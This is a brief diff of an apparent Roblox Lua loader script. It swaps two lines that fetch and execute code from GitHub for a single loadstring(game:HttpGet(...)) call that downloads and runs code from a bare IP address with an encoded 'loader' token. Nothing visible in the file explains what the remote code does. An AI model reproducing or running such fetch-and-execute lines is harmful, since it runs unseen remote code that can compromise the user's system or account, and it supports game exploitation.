@@ -1,8 +1,1 @@
-local function ScreenGui()
-loadstring(game:HttpGet('https://raw.githubusercontent.com/fekaola/xhub/refs/heads/main/rykablydsquad.lua'))()
-end
-local function Script()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/xeroxson/-/refs/heads/main/lopuh"))()
-end
-task.spawn(Script)
-task.spawn(ScreenGui)
+loadstring(game:HttpGet("http://109.71.240.235:3910/api/run/eyJpZCI6ImE3MjY2MDMwLTYwNmYtNDg4Mi1hOWZjLWU0ZGZiYmI1MWNlMSIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
